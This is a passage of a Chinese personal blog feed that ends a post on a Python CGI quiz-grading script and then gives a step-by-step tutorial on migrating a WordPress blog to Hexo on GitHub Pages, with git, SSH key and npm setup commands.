class="string">"a"</span>,<span class="string">"d"</span>,<span class="string">"a"</span>],[<span class="string">"b"</span>,<span class="string">"d"</span>,<span class="string">"c"</span>,<span class="string">"a"</span>],[<span class="string">"c"</span>,<span class="string">"a"</span>,<span class="string">"d"</span>,<span class="string">"b"</span>],[<span class="string">"b"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>]]</span><br><span class="line">    y02=[[<span class="string">"c"</span>,<span class="string">"b"</span>,<span class="string">"d"</span>,<span class="string">"d"</span>,<span class="string">"a"</span>],[<span class="string">"c"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>],[<span class="string">"b"</span>,<span class="string">"d"</span>,<span class="string">"d"</span>,<span class="string">"a"</span>,<span class="string">"a"</span>],[<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"b"</span>,<span class="string">"a"</span>,<span class="string">"d"</span>]]</span><br><span class="line">    y03=[[<span class="string">"b"</span>,<span class="string">"a"</span>,<span class="string">"c"</span>,<span class="string">"b"</span>,<span class="string">"d"</span>],[<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"b"</span>,<span class="string">"a"</span>,<span class="string">"d"</span>],[<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"c"</span>,<span class="string">"b"</span>,<span class="string">"a"</span>],[<span class="string">"c"</span>,<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"d"</span>,<span class="string">"c"</span>]]</span><br><span class="line">    y04=[[<span class="string">"c"</span>,<span class="string">"a"</span>,<span class="string">"d"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>],[<span class="string">"a"</span>,<span class="string">"d"</span>,<span class="string">"c"</span>,<span class="string">"b"</span>,<span class="string">"d"</span>],[<span class="string">"d"</span>,<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"a"</span>,<span class="string">"c"</span>],[<span class="string">"c"</span>,<span class="string">"a"</span>,<span class="string">"d"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>]]</span><br><span class="line">    y05=[[<span class="string">"c"</span>,<span class="string">"b"</span>,<span class="string">"a"</span>,<span class="string">"c"</span>,<span class="string">"b"</span>],[<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"a"</span>,<span class="string">"d"</span>,<span class="string">"b"</span>],[<span class="string">"a"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"d"</span>,<span class="string">"a"</span>],[<span class="string">"b"</span>,<span class="string">"d"</span>,<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>]]</span><br><span class="line">    y06=[[<span class="string">"c"</span>,<span class="string">"a"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"b"</span>],[<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"d"</span>],[<span class="string">"c"</span>,<span class="string">"a"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"b"</span>],[<span class="string">"d"</span>,<span class="string">"b"</span>,<span class="string">"d"</span>,<span class="string">"b"</span>,<span class="string">"a"</span>]]</span><br><span class="line">    y07=[[<span class="string">"c"</span>,<span class="string">"b"</span>,<span class="string">"a"</span>,<span class="string">"d"</span>,<span class="string">"c"</span>],[<span class="string">"d"</span>,<span class="string">"c"</span>,<span class="string">"a"</span>,<span class="string">"a"</span>,<span class="string">"b"</span>],[<span class="string">"c"</span>,<span class="string">"b"</span>,<span class="string">"d"</span>,<span class="string">"c"</span>,<span class="string">"b"</span>],[<span class="string">"d"</span>,<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"a"</span>,<span class="string">"d"</span>]]</span><br><span class="line">    y08=[[<span class="string">"a"</span>,<span class="string">"d"</span>,<span class="string">"c"</span>,<span class="string">"b"</span>,<span class="string">"d"</span>],[<span class="string">"d"</span>,<span class="string">"c"</span>,<span class="string">"a"</span>,<span class="string">"a"</span>,<span class="string">"b"</span>],[<span class="string">"a"</span>,<span class="string">"c"</span>,<span class="string">"b"</span>,<span class="string">"d"</span>,<span class="string">"c"</span>],[<span class="string">"d"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"a"</span>,<span class="string">"b"</span>]]</span><br><span class="line">    y09=[[<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"a"</span>,<span class="string">"d"</span>,<span class="string">"a"</span>],[<span class="string">"a"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"a"</span>,<span class="string">"b"</span>],[<span class="string">"d"</span>,<span class="string">"b"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"c"</span>],[<span class="string">"b"</span>,<span class="string">"b"</span>,<span class="string">"d"</span>,<span class="string">"a"</span>,<span class="string">"c"</span>]]</span><br><span class="line">    y10=[[<span class="string">"b"</span>,<span class="string">"a"</span>,<span class="string">"c"</span>,<span class="string">"a"</span>,<span class="string">"b"</span>],[<span class="string">"c"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"b"</span>,<span class="string">"a"</span>],[<span class="string">"b"</span>,<span class="string">"d"</span>,<span class="string">"a"</span>,<span class="string">"c"</span>,<span class="string">"c"</span>],[<span class="string">"a"</span>,<span class="string">"a"</span>,<span class="string">"c"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>]]</span><br><span class="line">    y11=[[<span class="string">"c"</span>,<span class="string">"b"</span>,<span class="string">"d"</span>,<span class="string">"b"</span>,<span class="string">"a"</span>],[<span class="string">"b"</span>,<span class="string">"d"</span>,<span class="string">"c"</span>,<span class="string">"a"</span>,<span class="string">"c"</span>],[<span class="string">"d"</span>,<span class="string">"c"</span>,<span class="string">"b"</span>,<span class="string">"a"</span>,<span class="string">"a"</span>],[<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"a"</span>,<span class="string">"d"</span>,<span class="string">"b"</span>]]</span><br><span class="line">    y12=[[<span class="string">"d"</span>,<span class="string">"b"</span>,<span class="string">"a"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>],[<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"a"</span>,<span class="string">"d"</span>,<span class="string">"a"</span>],[<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"b"</span>,<span class="string">"d"</span>,<span class="string">"c"</span>],[<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"a"</span>]]</span><br><span class="line">    y13=[[<span class="string">"b"</span>,<span class="string">"d"</span>,<span class="string">"a"</span>,<span class="string">"d"</span>,<span class="string">"c"</span>],[<span class="string">"b"</span>,<span class="string">"d"</span>,<span class="string">"c"</span>,<span class="string">"a"</span>,<span class="string">"d"</span>],[<span class="string">"b"</span>,<span class="string">"a"</span>,<span class="string">"d"</span>,<span class="string">"c"</span>,<span class="string">"c"</span>],[<span class="string">"c"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"a"</span>,<span class="string">"b"</span>]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">####</span></span><br><span class="line">    mydi=&#123;<span class="string">"y98"</span>:y98,<span class="string">"y99"</span>:y99,<span class="string">"y00"</span>:y00,<span class="string">"y01"</span>:y01,<span class="string">"y02"</span>:y02,<span class="string">"y03"</span>:y03,<span class="string">"y04"</span>:y04,<span class="string">"y05"</span>:y05,<span class="string">"y06"</span>:y06,<span class="string">"y07"</span>:y07,<span class="string">"y08"</span>:y08,<span class="string">"y09"</span>:y09,<span class="string">"y10"</span>:y10,<span class="string">"y11"</span>:y11,<span class="string">"y12"</span>:y12,<span class="string">"y13"</span>:y13&#125;</span><br><span class="line">    answer=[]</span><br><span class="line">    f=cgi.FieldStorage()</span><br><span class="line">    tag=f.getvalue(<span class="string">'data_1'</span>)</span><br><span class="line">    an1=f.getvalue(<span class="string">'data_2'</span>)</span><br><span class="line">    an2=f.getvalue(<span class="string">'data_3'</span>)</span><br><span class="line">    an3=f.getvalue(<span class="string">'data_4'</span>)</span><br><span class="line">    an4=f.getvalue(<span class="string">'data_5'</span>)</span><br><span class="line">    an5=f.getvalue(<span class="string">'data_6'</span>)</span><br><span class="line">    answer.append(str(an1))</span><br><span class="line">    answer.append(str(an2))</span><br><span class="line">    answer.append(str(an3))</span><br><span class="line">    answer.append(str(an4))</span><br><span class="line">    answer.append(str(an5))</span><br><span class="line">     <span class="comment">##</span></span><br><span class="line">    <span class="comment">#answer1=[["c","d","d","c"],None,None,None,None]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(answer)):</span><br><span class="line">        <span class="keyword">if</span> answer[i]!=<span class="string">'None'</span>:</span><br><span class="line">            answer[i]=str.split(answer[i],<span class="string">","</span>)</span><br><span class="line">        <span class="keyword">if</span> answer[i]==<span class="string">'None'</span>:</span><br><span class="line">            answer[i]=str.split(<span class="string">"e,e,e,e,"</span>,<span class="string">","</span>)</span><br><span class="line"></span><br><span class="line">    y=mydi[<span class="string">"y98"</span>]</span><br><span class="line">    flag=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(y)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(y[i])):</span><br><span class="line">            <span class="keyword">if</span> y[i][j]==answer[i][j]:</span><br><span class="line">                flag=flag+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Content-Type:text/html\n\n"</span>)</span><br><span class="line">    print(<span class="string">"&lt;html&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;head&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;title&gt;result&lt;/title&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;script&gt;"</span>)</span><br><span class="line">    print(<span class="string">"function tz()&#123;"</span>)</span><br><span class="line">    print(<span class="string">" window.location.href='http://139.224.115.186:8080'"</span>)</span><br><span class="line">     print(<span class="string">"&#125;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;/script&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;style&gt;"</span>)</span><br><span class="line">    print(<span class="string">"body &#123;"</span>)</span><br><span class="line">    print(<span class="string">" background-image : url(http://img18.3lian.com/d/file/201711/27/76041b1cf0ee94a40179305554f1eda7.png)"</span>)</span><br><span class="line">    print(<span class="string">";"</span>)</span><br><span class="line">    print(<span class="string">" background-size: 100%  &#125;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;/style&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;/head&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;body&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;h1 align=center&gt;The number of correct answer you gave&lt;br&gt;"</span>)</span><br><span class="line">    print(str(flag))</span><br><span class="line">    print(<span class="string">"&lt;/h1&gt;&lt;br&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;div align=center&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;button  onclick=tz()&gt;return&lt;/button&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;/div&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;/body&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;/html&gt;"</span>)</span><br></pre></td></tr></table></figure></div>

<p>上面代码有些乱，因为一开始因为linux还有windows文件编码不一样，我一开始直接从windows拷贝过去的，结果linux一直报错，最后用vim重写的，所以都写一块了很乱，没有写函数。</p>
<p>其实核心思想说一下，就是我们调用这个python处理，然后输出一个前端页面再给前端，其中包含着我们的结果就行了。</p>
<p>我们来测试一下</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1563942442214.png" data-fancybox="group" data-caption="1563942442214" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1563942442214.png" alt="1563942442214" title="1563942442214"></a></li>
</ul>
<p>发现成功，返回结果正确。</p>
<h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3 总结"></a>3 总结</h2><p>​    这次乱搞弄了一个与web前端交互的python cgi后端程序，也算是对这方面有了一些简单的了解，然后通过动手操作也发现了好多坑，代码能在linux上写就在上面写，虽然说是shell界面，但是vim用的6也可能不比别的差，我这种在windows上用IDE用多了，vim就显得很生疏，不过最终问题也解决了。这个里面反正还是有几点需要注意的</p>
<ol>
<li>注意关联文件开启cgi功能</li>
<li>注意给予文件权限，以及制定python解释器执行</li>
<li>注意不同平台编码问题</li>
</ol>
]]></content>
      <categories>
        <category>胡乱折腾</category>
      </categories>
      <tags>
        <tag>胡乱折腾</tag>
        <tag>python</tag>
        <tag>cgi</tag>
      </tags>
  </entry>
  <entry>
    <title>wordpress博客迁移到hexo（基于Github）</title>
    <url>/2019/07/10/Wordpress%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E5%88%B0Hexo/</url>
    <content><![CDATA[<h1 id="Wordpress博客迁移到Hexo（基于github）"><a href="#Wordpress博客迁移到Hexo（基于github）" class="headerlink" title="Wordpress博客迁移到Hexo（基于github）"></a>Wordpress博客迁移到Hexo（基于github）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    最近迁移博客（原来博客<a href="http:\www.evil-qinghua.top" target="_blank" rel="noopener">地址</a>），发现WP虽然社区环境不错，但是插件冲突太多，原因吗我先balabala</p>
<p>（首先呢需要mysql,php，环境，这个如果从其它角度来说你windows服务器（安全性远不如linux，当然你要用openbsd更好）还好，如果是linux，一般瞎打乱撞装个php7以上的版本，然后没有自带Mysqli这些库，后面问题一大堆，如果是下载源码直接编译，那更是上了天了，去年我一开始搞得时候，踩坑就踩了三四天。hexo的特性叫他可以很轻量级，你甚至可以在github上直接构建一个博客，这样你甚至不用去整一个服务器，然后域名直接绑定就OK），其实主要是我手头去年在狗爹上买了一个.me的域名，感觉这个做博客更好一些，但是我的ECS是阿里的，绑定不了外国域名，这就很头疼，就绑了国内的域名，这下也可以开开心心的用我的me了！</p>
<p>另一方面我需求好多都比较冗余，所以呢想法我的博客迁移到Hexo，从前就听朋友们说这个Hexo（不过最近听说hugo更猛）轻量并且很好用，最重要的是可以直接编辑Makedown，直接生成静态页面，很快，有没有，直接写Md，这个比wp装一堆乱七八糟的插件好用多了，所以我在这里来动手操作一下博客迁移。</p>
<h2 id="1-导出wp的文件"><a href="#1-导出wp的文件" class="headerlink" title="1.导出wp的文件"></a>1.导出wp的文件</h2><p> 这个简单，我们直接导出文件就行，在WP后台导出是一个xml文件。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/QQ%E6%88%AA%E5%9B%BE20190708202104.png" data-fancybox="group" data-caption="QQ截图20190708202104" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/QQ%E6%88%AA%E5%9B%BE20190708202104.png" alt="QQ截图20190708202104" title="QQ截图20190708202104"></a></p>
<p>点击下载即可。</p>
<h2 id="2-Hexo在github部署"><a href="#2-Hexo在github部署" class="headerlink" title="2.Hexo在github部署"></a>2.Hexo在github部署</h2><h3 id="2-1需要工具以及环境"><a href="#2-1需要工具以及环境" class="headerlink" title="2.1需要工具以及环境"></a>2.1需要工具以及环境</h3><p>​    1.git  下载个git</p>
<p>​    2.node.js环境</p>
<p>​    3.windows或者linux系统都可以，我这里是linux系统，你可以在windows上操作，windows的图形界面很方便。 </p>
<h3 id="2-2配置github仓库"><a href="#2-2配置github仓库" class="headerlink" title="2.2配置github仓库"></a>2.2配置github仓库</h3><p>首先我们去github上弄一个仓库。</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562592180523.png" data-fancybox="group" data-caption="1562592180523" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562592180523.png" alt="1562592180523" title="1562592180523"></a><a href></a></li>
</ul>
<p>这里我们先搞一个仓库，名称格式如下（这里注意网上给的图他们的生成第一次结束之后那个url有问题，不要看那个图，按照步骤执行即可）</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562593417066.png" data-fancybox="group" data-caption="1562593417066" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562593417066.png" alt="1562593417066" title="1562593417066"></a></li>
</ul>
<p>比如这种，是不正确的。</p>
<p>name.github.io</p>
<p>注意，名字一定要是你的用户名，这里我们会依赖我们的用户名建立一个分配给我们的githubpage</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562593206741.png" data-fancybox="group" data-caption="1562593206741" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562593206741.png" alt="1562593206741" title="1562593206741"></a></li>
</ul>
<p>然后仓库构建成功，点击右上角的setting我这里网页翻译了，就是设置，然后拉到最下面，有个构建github页面的，在这里我们添加一个主题，不然github页面没法发布。这个如果你看到ctk-wiki那些东西的话，你应该能体会其中的原理了。</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562593183837.png" data-fancybox="group" data-caption="1562593183837" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562593183837.png" alt="1562593183837" title="1562593183837"></a></li>
</ul>
<p>然后我们访问 blue-and-white.github.io  成功，构建完成，下一步我们要进行hexo的搭建了。</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562593319882.png" data-fancybox="group" data-caption="1562593319882" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562593319882.png" alt="1562593319882" title="1562593319882"></a></li>
</ul>
<p>这里我们要绑定下秘钥信息，在我们生成github仓库的时候，有两个链接，一个是ssh的，一个是https的，https的需要我们每次输入账号密码，ssh只需要验证秘钥即可。这个为我们以后提交代码方便。</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562593799824.png" data-fancybox="group" data-caption="1562593799824" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562593799824.png" alt="1562593799824" title="1562593799824"></a></li>
</ul>
<p>首先看看我们有没有这个key 进入发现是没有的。这个我们就需要生成一下了。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;你的用户名&quot;</span><br><span class="line">git config --global user.email &quot;邮箱地址&quot;</span><br></pre></td></tr></table></figure></div>

<p>这里绑定一下信息。</p>
<p>然后输入命令生成</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562593972752.png" data-fancybox="group" data-caption="1562593972752" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562593972752.png" alt="1562593972752" title="1562593972752"></a></li>
</ul>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;邮箱&quot;</span><br></pre></td></tr></table></figure></div>

<p>输入第一行的命令，然后连续三下回车。</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562594069278.png" data-fancybox="group" data-caption="1562594069278" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562594069278.png" alt="1562594069278" title="1562594069278"></a></li>
</ul>
<p>然后我们发现出现了id_rsa.pub这个文件。</p>
<p>vim 打开复制里面的公钥内容。</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562594207324.png" data-fancybox="group" data-caption="1562594207324" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562594207324.png" alt="1562594207324" title="1562594207324"></a></li>
</ul>
<p>进入github主页，点击设置。</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562594322411.png" data-fancybox="group" data-caption="1562594322411" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562594322411.png" alt="1562594322411" title="1562594322411"></a></li>
</ul>
<p>然后添加key。</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562594396715.png" data-fancybox="group" data-caption="1562594396715" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562594396715.png" alt="1562594396715" title="1562594396715"></a></li>
</ul>
<p>会要求我们输入密码，然后输入密码，添加成功！</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562594482021.png" data-fancybox="group" data-caption="1562594482021" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562594482021.png" alt="1562594482021" title="1562594482021"></a></li>
</ul>
<p>然后我们输入ssh -T git@github,com 验证，这里出现登录成功！</p>
<h3 id="2-3-配置hexo"><a href="#2-3-配置hexo" class="headerlink" title="2.3 配置hexo"></a>2.3 配置hexo</h3><p>仓库弄好了，接下来我们配置hexo</p>
<p>我在usr下面建立了一个文件夹blog 当然你也可以用一下语法进行</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo init 指定目录（如果没有指定默认当前目录）</span><br></pre></td></tr></table></figure></div>

<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562594966704.png" data-fancybox="group" data-caption="1562594966704" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562594966704.png" alt="1562594966704" title="1562594966704"></a></li>
</ul>
<p>然后等待一下。</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562595683732.png" data-fancybox="group" data-caption="1562595683732" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562595683732.png" alt="1562595683732" title="1562595683732"></a></li>
</ul>
<p>这里我们看到生成结束了，这里能用了，我们运行测试一下。</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562595951039.png" data-fancybox="group" data-caption="1562595951039" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562595951039.png" alt="1562595951039" title="1562595951039"></a></li>
</ul>
<p>然后运行hexo g 生成文件</p>
<p>如果报错执行  </p>
<p>npm install hexo –save</p>
<p>即可</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562596033217.png" data-fancybox="group" data-caption="1562596033217" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562596033217.png" alt="1562596033217" title="1562596033217"></a></li>
</ul>
<p>我们会看到目录下多出一个public文件夹，这里放着生成的html代码。</p>
<p>你可以输入hexo s启动服务访问本地4000端口，然后可以看到页面。</p>
<p>这里我们可以更换一下主题</p>
<p>比如说我找到了一个主题，我首先把他下载下来。（这些主题可以我们在github上找，也可以去hexo官方选定下载）</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/liuyib/hexo-theme-stun.git themes/stun</span><br></pre></td></tr></table></figure></div>

<p>下载成功，vim打开_config.yml文件修改主题内容（这里我们要强调得是，有一些主题要我们加入一些插件啥的，这个我们注意阅读文档下载就行了）</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562596874323.png" data-fancybox="group" data-caption="1562596874323" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562596874323.png" alt="1562596874323" title="1562596874323"></a></li>
</ul>
<p>修改为主题名，保存退出。然后输入hexo  g 重新生成。</p>
<p>然后准备上传到github仓库</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562599229600.png" data-fancybox="group" data-caption="1562599229600" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562599229600.png" alt="1562599229600" title="1562599229600"></a></li>
</ul>
<p>修改配置文件里面的deploy字段</p>
<p>然后保存退出</p>
<p>执行</p>
<p>hexo d</p>
<p>这里会提示有错误</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562599273118.png" data-fancybox="group" data-caption="1562599273118" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562599273118.png" alt="1562599273118" title="1562599273118"></a></li>
</ul>
<p>原因缺少一个插件，安装</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure></div>

<p>之后就可以执行了</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562599384796.png" data-fancybox="group" data-caption="1562599384796" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562599384796.png" alt="1562599384796" title="1562599384796"></a></li>
</ul>
<p>执行成功！</p>
<p>但是我发现并没有html文件，主页文件比如说Index.html 这里我去查阅了一下资料，这个可能是缺一些库导致的。</p>
<p>我们来尝试解决这个问题</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562601012932.png" data-fancybox="group" data-caption="1562601012932" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562601012932.png" alt="1562601012932" title="1562601012932"></a></li>
</ul>
<p>执行 npm ls –depth 0</p>
<p>发现真的缺了不少包，把这些包装上就好了</p>
<p>npm install  包名  –save</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562601911694.png" data-fancybox="group" data-caption="1562601911694" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562601911694.png" alt="1562601911694" title="1562601911694"></a></li>
</ul>
<p>OK,安装完成。</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562601968382.png" data-fancybox="group" data-caption="1562601968382" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562601968382.png" alt="1562601968382" title="1562601968382"></a></li>
</ul>
<p>哈哈哈，这次生成成功了。</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562602026909.png" data-fancybox="group" data-caption="1562602026909" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562602026909.png" alt="1562602026909" title="1562602026909"></a></li>
</ul>
<p>OK！成功构建！！！</p>
<p>这个主题没有wp那样方便，手动ppt那种一样，需要修改配置文件。我去看看官方文档了解一些配置文件balabala</p>
<h2 id="迁移wordpress"><a href="#迁移wordpress" class="headerlink" title="迁移wordpress"></a>迁移wordpress</h2><p>​    首先我们需要在wordpress后台导出xml文件</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562678273905.png" data-fancybox="group" data-caption="1562678273905" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562678273905.png" alt="1562678273905" title="1562678273905"></a></li>
</ul>
<p>然后下一步我们安装一个转换插件（这个插件转化出来从前的格式可能会变好多，切记修改一下）</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-migrator-wordpress --save</span><br><span class="line">hexo migrate wordpress &lt;source&gt; #source是xml文件路径</span><br></pre></td></tr></table></figure></div>

<p>​    </p>
<p>执行</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562678352806.png" data-fancybox="group" data-caption="1562678352806" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562678352806.png" alt="1562678352806" title="1562678352806"></a></li>
</ul>
<p>导出文章！</p>
<p>然后在/source/post目录下就会有我们导出来的文章，这些文章啥的虽然说都给我们添加了头信息，但是我们还是需要改一下因为原先的网站可能跟现在不一样。</p>
<p>这里我们来演示改其中一篇</p>
<p>比如说我有一篇，关于DVWA靶场的小测</p>
